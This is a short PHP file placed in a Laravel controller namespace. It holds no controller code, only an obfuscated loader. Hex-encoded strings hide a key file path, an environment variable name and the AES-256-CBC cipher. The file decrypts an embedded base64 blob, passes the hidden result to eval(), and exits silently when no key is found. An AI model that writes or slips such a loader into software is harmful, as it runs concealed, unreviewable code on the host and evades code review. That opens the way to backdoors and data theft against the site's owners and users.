<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('72u/Zh3wm7yA7bO6r+5Ixg==');

$c=base64_decode(

'9o4aC0Y5XMCpPAgvr8WkHANY/4/aiFfq77ltRSbknPi+YLpaPInoyI+fZl2Mtlu6/CMU3gqDyJlw' .
'ziXL+WLY37E1gpXdbHsoILD2wYUpCaIsEBnflQMllVuQ3W8/p/1Uh6pdUI85+AlAwhCEWqUewtlD' .
'ig5p7BggPiCwSP83uGha9fZr3sNlirZMqcWMSZ8qtTg1BN3mVJvvX3I3mvSUVvVtGDEndhuhORF9' .
'f8kli+xdjwfYcKIa49RzWK51RF6i'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

